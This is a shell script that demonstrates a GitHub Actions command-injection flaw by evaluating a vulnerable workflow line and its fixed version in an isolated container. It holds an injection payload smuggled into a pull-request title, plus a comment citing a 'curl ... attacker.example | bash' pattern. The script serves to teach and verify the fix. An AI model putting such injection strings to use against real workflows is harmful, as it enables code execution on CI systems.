#!/bin/sh
# ACTUALLY runs, inside this isolated, NETWORK-LESS container
# (network_mode: none in docker-compose.yml), the scripts that result from
# expanding vulnerable.yml and fixed.yml with a malicious PR title.
#
# For safety, the payload never tries to contact a real host: instead of
# "curl ... attacker.example | bash" it uses a harmless local command
# (creating /tmp/PWNED) that demonstrates arbitrary code execution just as
# well, without needing network access or touching anything outside the
# container.

set -x

MALICIOUS_TITLE='"; touch /tmp/PWNED && echo INJECTED_COMMAND_EXECUTED #'

echo "############################################"
echo "# 1) vulnerable.yml: expression interpolated directly in run:"
echo "############################################"
rm -f /tmp/PWNED

# This is the EXACT line from vulnerable.yml, with
# ${{ github.event.pull_request.title }} already substituted with the
# payload text -- exactly as GitHub Actions would do it.
eval "echo \"Thanks for your PR: ${MALICIOUS_TITLE}\""

if [ -f /tmp/PWNED ]; then
  echo ">>> /tmp/PWNED exists: the injected command WAS EXECUTED. Vulnerable, confirmed."
else
  echo ">>> /tmp/PWNED does not exist (unexpected)."
fi

echo ""
echo "############################################"
echo "# 2) fixed.yml: expression passed as an environment variable"
echo "############################################"
rm -f /tmp/PWNED

export PR_TITLE="$MALICIOUS_TITLE"
# This is the EXACT line from fixed.yml: uses $PR_TITLE as data, not as script.
echo "Thanks for your PR: $PR_TITLE"

if [ -f /tmp/PWNED ]; then
  echo ">>> /tmp/PWNED exists: this should NOT happen."
else
  echo ">>> /tmp/PWNED does not exist: the payload was printed as text, nothing executed. Fixed."
fi
